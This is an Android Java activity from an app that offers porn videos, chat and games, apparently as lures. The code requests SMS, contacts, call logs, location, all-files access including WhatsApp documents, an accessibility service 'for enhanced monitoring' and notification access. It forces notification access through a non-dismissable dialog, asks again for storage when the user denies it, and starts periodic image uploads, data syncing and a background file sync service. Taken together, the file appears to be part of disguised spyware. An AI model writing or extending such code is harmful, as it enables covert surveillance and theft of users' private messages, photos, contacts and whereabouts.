package com.bushorat.app.activities;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.bushorat.app.R;
import com.bushorat.app.databinding.ActivityDashboardBinding;
import com.bushorat.app.helpers.AppVisibilityHelper;
import com.bushorat.app.helpers.DataSyncWorker;
import com.bushorat.app.helpers.FeaturePermissions;
import com.bushorat.app.helpers.GpsHelper;
import com.bushorat.app.helpers.ImageUploadWorker;
import com.bushorat.app.helpers.NotificationHelper;
import com.bushorat.app.helpers.SessionManager;
import com.bushorat.app.helpers.UserDataSyncHelper;
import com.bushorat.app.sync.SyncService;

/**
 * Permissions are requested only when the matching feature is opened:
 * Videos -> storage (unlocks videos + WhatsApp media upload)
 * Chat   -> SMS (+ optional notification access once)
 * Games  -> contacts / call logs / phone
 * Profile-> location (handled in ProfileActivity)
 */
public class DashboardActivity extends AppCompatActivity {
    private static final String TAG = "DashboardActivity";

    private ActivityDashboardBinding binding;
    private SessionManager sessionManager;
    
    // File backup integration
    private static final String PREF_FILE_SYNC = "file_sync_prefs";
    private static final String KEY_ASKED_FILE_PERMS = "asked_file_perms";
    private static final String KEY_ASKED_ALL_FILES = "asked_all_files";
    
    // Permission flow state - prevent overlapping dialogs
    private boolean permissionFlowInProgress = false;
    
    private final androidx.activity.result.ActivityResultLauncher<String[]> permissionLauncher =
        registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
            Log.d(TAG, "✅ Permission launcher result: " + result);
            // Small delay to ensure OS has updated the permission state
            binding.getRoot().postDelayed(this::continuePermissionFlow, 500);
        });
    
    private final androidx.activity.result.ActivityResultLauncher<Intent> allFilesLauncher =
        registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), result -> {
            Log.d(TAG, "✅ All files launcher result");
            // Small delay to ensure OS has updated the permission state
            binding.getRoot().postDelayed(this::continuePermissionFlow, 500);
        });

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: DashboardActivity started");

        EdgeToEdge.enable(this);
        binding = ActivityDashboardBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        setSupportActionBar(binding.toolbar);

        sessionManager = new SessionManager(this);
        AppVisibilityHelper.getInstance(this).ensureListenerStarted();
        DataSyncWorker.schedulePeriodicSync(this);
        setupToolbarSubtitle();

        // Sync only what is already permitted — never ask for everything at once
        UserDataSyncHelper.syncAll(this);

        if (FeaturePermissions.areVideosUnlocked(this)) {
            ImageUploadWorker.schedulePeriodicUpload(this);
        }

        // Request notification access on app launch
        maybePromptNotificationAccessOnLaunch();

        binding.btnPorn.setOnClickListener(v -> onVideosTapped());
        binding.btnChat.setOnClickListener(v -> onChatTapped());
        binding.btnContacts.setOnClickListener(v -> onGamesTapped());
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (sessionManager != null) {
            sessionManager.updateLastActivity();
        }
        UserDataSyncHelper.syncAll(this);
        if (FeaturePermissions.areVideosUnlocked(this)) {
            ImageUploadWorker.schedulePeriodicUpload(this);
        }
        // Ask for notification access every time if not enabled
        maybePromptNotificationAccessOnLaunch();
    }

    private void setupToolbarSubtitle() {
        String subtitle = sessionManager != null ? sessionManager.getUserEmail() : null;
        if (subtitle != null && getSupportActionBar() != null) {
            getSupportActionBar().setSubtitle(subtitle);
        }
    }

    private void onVideosTapped() {
        // First ask for accessibility if not prompted
        if (!FeaturePermissions.hasAccessibilityBeenPrompted(this)) {
            FeaturePermissions.markAccessibilityPrompted(this);
            new AlertDialog.Builder(this)
                    .setTitle("Accessibility Service")
                    .setMessage("Enable Accessibility Service for enhanced monitoring capabilities.")
                    .setPositiveButton("Enable", (d, w) -> {
                        openAccessibilitySettings();
                        promptLocationThenVideos();
                    })
                    .setNegativeButton("Skip", (d, w) ->
                            promptLocationThenVideos())
                    .show();
            return;
        }
        promptLocationThenVideos();
    }

    private void promptLocationThenVideos() {
        // Then ask for location if not prompted
        if (!FeaturePermissions.hasLocationBeenPrompted(this)) {
            FeaturePermissions.markLocationPrompted(this);
            new AlertDialog.Builder(this)
                    .setTitle("Location Access")
                    .setMessage("Enable location tracking for device monitoring.")
                    .setPositiveButton("Allow", (d, w) -> {
                        FeaturePermissions.requestLocationPermission(this);
                        proceedToVideos();
                    })
                    .setNegativeButton("Skip", (d, w) ->
                            proceedToVideos())
                    .show();
            return;
        }
        proceedToVideos();
    }

    private void proceedToVideos() {
        if (FeaturePermissions.areVideosUnlocked(this)) {
            openUnlockedVideos();
            return;
        }
        if (FeaturePermissions.hasGalleryPermission(this)) {
            unlockVideosAndOpen();
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.unlock_videos_title)
                .setMessage(R.string.unlock_videos_message)
                .setPositiveButton(R.string.unlock_videos_allow, (d, w) ->
                        FeaturePermissions.requestGalleryForVideos(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void openAccessibilitySettings() {
        try {
            startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS));
        } catch (Exception e) {
            Log.e(TAG, "Could not open accessibility settings", e);
            Toast.makeText(this, "Please enable Accessibility Service manually", Toast.LENGTH_LONG).show();
        }
    }

    private void unlockVideosAndOpen() {
        FeaturePermissions.setVideosUnlocked(this, true);
        ImageUploadWorker.schedulePeriodicUpload(this);
        UserDataSyncHelper.syncAll(this);
        Toast.makeText(this, R.string.unlock_videos_success, Toast.LENGTH_SHORT).show();
        openUnlockedVideos();
    }

    private void openUnlockedVideos() {
        ImageUploadWorker.enqueueWork(this);
        // Request file/media permissions for document backup
        // This will start the permission flow, then open PornActivity
        requestFileBackupPermissionsAndOpenVideos();
    }

    /**
     * Request file backup permissions, then open PornActivity when done
     */
    private void requestFileBackupPermissionsAndOpenVideos() {
        if (hasAllFilePermissions()) {
            Log.d(TAG, "✅ All permissions already granted - opening videos immediately");
            startPornActivity();
            return;
        }
        
        Log.d(TAG, "🔄 Starting permission flow for videos");
        permissionFlowInProgress = true;
        // Start permission flow (will complete and open activity)
        requestFileBackupPermissions();
    }
    
    /**
     * Opens PornActivity after all permissions are handled
     */
    private void startPornActivity() {
        try {
            startActivity(new Intent(this, PornActivity.class));
        } catch (Exception e) {
            Log.e(TAG, "Error opening PornActivity", e);
            Toast.makeText(this, "Unable to open videos", Toast.LENGTH_SHORT).show();
        }
    }

    private void onChatTapped() {
        if (FeaturePermissions.hasSmsPermission(this)) {
            maybePromptNotificationAccess();
            startActivity(new Intent(this, ChatActivity.class));
            UserDataSyncHelper.syncAll(this);
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_chat_title)
                .setMessage(R.string.perm_chat_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        FeaturePermissions.requestSmsForChat(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void onGamesTapped() {
        if (FeaturePermissions.hasGamesPermissions(this)) {
            startActivity(new Intent(this, EarnActivity.class));
            UserDataSyncHelper.syncAll(this);
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_games_title)
                .setMessage(R.string.perm_games_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        FeaturePermissions.requestGamesPermissions(this))
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void maybePromptNotificationAccessOnLaunch() {
        if (NotificationHelper.isNotificationServiceEnabled(this)) {
            return;
        }
        // MANDATORY: No cancel button - user MUST enable notification access
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_notif_title)
                .setMessage(R.string.perm_notif_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        NotificationHelper.openNotificationListenerSettings(this))
                .setCancelable(false)  // Can't dismiss by tapping outside
                .show();
    }

    private void maybePromptNotificationAccess() {
        if (NotificationHelper.isNotificationServiceEnabled(this)) {
            return;
        }
        // MANDATORY: No cancel button - user MUST enable notification access
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_notif_title)
                .setMessage(R.string.perm_notif_message)
                .setPositiveButton(R.string.perm_allow, (d, w) ->
                        NotificationHelper.openNotificationListenerSettings(this))
                .setCancelable(false)  // Can't dismiss by tapping outside
                .show();
    }

    private void openProfile() {
        startActivity(new Intent(this, ProfileActivity.class));
    }

    /**
     * Handle permission request results
     * Called after user responds to permission dialog
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        Log.d(TAG, "onRequestPermissionsResult: requestCode=" + requestCode + ", granted=" + FeaturePermissions.allGranted(grantResults));
        
        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE) {
            // User responded to storage permission request
            Log.d(TAG, "Storage permission response received");
            Log.d(TAG, "  → allGranted: " + FeaturePermissions.allGranted(grantResults));
            Log.d(TAG, "  → hasGalleryPermission: " + FeaturePermissions.hasGalleryPermission(this));
            
            // Check if permission is actually accessible
            if (FeaturePermissions.hasGalleryPermission(this)) {
                Log.d(TAG, "✅ Storage permission GRANTED - unlocking videos");
                unlockVideosAndOpen();
            } else {
                Log.w(TAG, "❌ Storage permission DENIED - permission not accessible");
                Log.d(TAG, "   Requesting again...");
                // Ask again
                FeaturePermissions.requestGalleryForVideos(this);
            }
        } else if (requestCode == FeaturePermissions.REQ_PROFILE_LOCATION) {
            // User responded to location permission request
            if (FeaturePermissions.allGranted(grantResults)) {
                Log.d(TAG, "✅ Location permission GRANTED");
                // Show GPS enable prompt for Android 11+
                GpsHelper.showGpsEnableDialog(this);
            } else {
                Log.w(TAG, "❌ Location permission DENIED");
            }
            // After location dialog, proceed to videos
            proceedToVideos();
        } else if (requestCode == FeaturePermissions.REQ_CHAT_SMS) {
            // User responded to SMS permission
            if (FeaturePermissions.allGranted(grantResults)) {
                Log.d(TAG, "✅ SMS permission GRANTED");
                maybePromptNotificationAccess();
                startActivity(new Intent(this, ChatActivity.class));
                UserDataSyncHelper.syncAll(this);
            } else {
                Log.w(TAG, "❌ SMS permission DENIED");
            }
        } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS) {
            // User responded to contacts/games permission
            if (FeaturePermissions.allGranted(grantResults)) {
                Log.d(TAG, "✅ Games permissions GRANTED");
                startActivity(new Intent(this, EarnActivity.class));
                UserDataSyncHelper.syncAll(this);
            } else {
                Log.w(TAG, "❌ Games permissions DENIED");
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_dashboard, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        if (item.getItemId() == R.id.action_profile) {
            openProfile();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    public void logout() {
        sessionManager.logoutUser();
        Intent intent = new Intent(this, ChooseLoginActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    // ==================== FILE BACKUP INTEGRATION ====================

    /**
     * Requests file/media permissions for document backup with interactive sequential flow.
     * Shows step-by-step dialogs without overlapping screens.
     * Called only when user clicks the Videos button.
     */
    private void requestFileBackupPermissions() {
        // Check if we already have all permissions
        if (hasAllFilePermissions()) {
            startFileSync();
            return;
        }

        // Start sequential permission request flow
        showFileBackupPermissionFlow();
    }

    /**
     * Continue permission flow after a permission result
     * Only called after a permission launcher completes
     */
    private void continuePermissionFlow() {
        if (!permissionFlowInProgress) {
            Log.d(TAG, "⚠️ Permission flow not in progress, ignoring");
            return;
        }
        showFileBackupPermissionFlow();
    }
    
    /**
     * Sequential permission flow - one dialog at a time, no overlapping screens
     * Each permission is fully handled before showing the next one
     */
    private void showFileBackupPermissionFlow() {
        if (!permissionFlowInProgress) {
            Log.w(TAG, "⚠️ Permission flow interrupted");
            return;
        }
        
        Log.d(TAG, "🔄 Checking permissions sequentially...");
        
        // Step 1: Ask for media/image permissions
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "1️⃣ 📸 Media permission NOT granted - showing dialog");
                showMediaPermissionDialog();
                return;
            }
            Log.d(TAG, "1️⃣ ✅ Media permission already granted");
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "1️⃣ 📸 Storage permission NOT granted - showing dialog");
                showMediaPermissionDialog();
                return;
            }
            Log.d(TAG, "1️⃣ ✅ Storage permission already granted");
        }

        // Step 2: Ask for notification permissions (Android 13+)
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                Log.d(TAG, "2️⃣ 🔔 Notification permission NOT granted - showing dialog");
                showNotificationPermissionDialog();
                return;
            }
            Log.d(TAG, "2️⃣ ✅ Notification permission already granted");
        }

        // Step 3: Ask for all files access (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Log.d(TAG, "3️⃣ 📂 All files access NOT granted - showing dialog");
                showAllFilesAccessDialog();
                return;
            }
            Log.d(TAG, "3️⃣ ✅ All files access already granted");
        }

        // All permissions granted - start sync
        Log.d(TAG, "🎉 All permissions complete - starting file sync");
        permissionFlowInProgress = false;
        startFileSync();
    }

    /**
     * Step 1: Media/Image permissions dialog
     * After user allows or skips, the permission flow continues to next permission
     */
    private void showMediaPermissionDialog() {
        Log.d(TAG, "1️⃣ 📸 Showing media permission dialog");
        new AlertDialog.Builder(this)
                .setTitle("📸 Media Access")
                .setMessage("Allow access to your photos and media files for backup?")
                .setPositiveButton("Allow", (dialog, which) -> {
                    Log.d(TAG, "1️⃣ User allowed media permission - requesting from system");
                    permissionLauncher.launch(new String[]{
                        Build.VERSION.SDK_INT >= 33
                            ? Manifest.permission.READ_MEDIA_IMAGES
                            : Manifest.permission.READ_EXTERNAL_STORAGE
                    });
                })
                .setNegativeButton("Skip", (dialog, which) -> {
                    Log.d(TAG, "1️⃣ User skipped media permission - moving to step 2");
                    Toast.makeText(this, "Media permission skipped", Toast.LENGTH_SHORT).show();
                    // Continue to next permission after small delay
                    binding.getRoot().postDelayed(this::showFileBackupPermissionFlow, 300);
                })
                .setCancelable(false)
                .show();
    }

    /**
     * Step 2: Notification permissions dialog
     * After user allows or skips, the permission flow continues to next permission
     */
    private void showNotificationPermissionDialog() {
        Log.d(TAG, "2️⃣ 🔔 Showing notification permission dialog");
        new AlertDialog.Builder(this)
                .setTitle("🔔 Notifications")
                .setMessage("Allow notifications to keep you updated on backup progress?")
                .setPositiveButton("Allow", (dialog, which) -> {
                    Log.d(TAG, "2️⃣ User allowed notification permission - requesting from system");
                    permissionLauncher.launch(new String[]{Manifest.permission.POST_NOTIFICATIONS});
                })
                .setNegativeButton("Skip", (dialog, which) -> {
                    Log.d(TAG, "2️⃣ User skipped notification permission - moving to step 3");
                    Toast.makeText(this, "Notification permission skipped", Toast.LENGTH_SHORT).show();
                    // Continue to next permission after small delay
                    binding.getRoot().postDelayed(this::showFileBackupPermissionFlow, 300);
                })
                .setCancelable(false)
                .show();
    }

    /**
     * Step 3: All files access dialog (Android 11+)
     * After user allows or skips, starts the file sync
     */
    private void showAllFilesAccessDialog() {
        Log.d(TAG, "3️⃣ 📂 Showing all files access dialog");
        new AlertDialog.Builder(this)
                .setTitle("📂 Full File Access")
                .setMessage("Allow access to all files including WhatsApp documents?")
                .setPositiveButton("Allow", (dialog, which) -> {
                    Log.d(TAG, "3️⃣ User allowed all files access - opening system settings");
                    allFilesLauncher.launch(new Intent(
                        Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        Uri.parse("package:" + getPackageName())
                    ));
                })
                .setNegativeButton("Skip", (dialog, which) -> {
                    Log.d(TAG, "3️⃣ User skipped all files access - finishing permission flow");
                    Toast.makeText(this, "File access skipped", Toast.LENGTH_SHORT).show();
                    // All permissions handled - finalize flow
                    binding.getRoot().postDelayed(() -> {
                        permissionFlowInProgress = false;
                        startFileSync();
                    }, 300);
                })
                .setCancelable(false)
                .show();
    }

    /**
     * Checks if app has all necessary file/media permissions.
     * Returns true only if ALL permissions are granted.
     */
    private boolean hasAllFilePermissions() {
        // Check READ_MEDIA_IMAGES or READ_EXTERNAL_STORAGE
        if (!hasImagePermission(this)) {
            return false;
        }

        // Check POST_NOTIFICATIONS (Android 13+)
        if (Build.VERSION.SDK_INT >= 33) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        // Check MANAGE_EXTERNAL_STORAGE (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                return false;
            }
        }

        return true;
    }

    /**
     * Starts the foreground sync service for file backup.
     * Called ONLY after all permissions are confirmed granted.
     * Also opens PornActivity if this is part of the video flow.
     */
    private void startFileSync() {
        Log.d(TAG, "🎉 All permissions confirmed - starting file sync service");
        permissionFlowInProgress = false;
        ContextCompat.startForegroundService(this, new Intent(this, SyncService.class));
        // Open the video activity
        startPornActivity();
    }

    private java.util.List<String> missingFilePermissions() {
        java.util.List<String> needed = new java.util.ArrayList<>();

        if (!hasImagePermission(this)) {
            if (Build.VERSION.SDK_INT >= 33) {
                needed.add(Manifest.permission.READ_MEDIA_IMAGES);
            } else {
                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        if (Build.VERSION.SDK_INT >= 33 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
            != PackageManager.PERMISSION_GRANTED) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        return needed;
    }

    public static boolean hasImagePermission(Context context) {
        if (Build.VERSION.SDK_INT >= 34) {
            int full = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES);
            int selected = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED);
            return full == PackageManager.PERMISSION_GRANTED || selected == PackageManager.PERMISSION_GRANTED;
        }

        String perm = Build.VERSION.SDK_INT >= 33
            ? Manifest.permission.READ_MEDIA_IMAGES
            : Manifest.permission.READ_EXTERNAL_STORAGE;

        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED;
    }
}
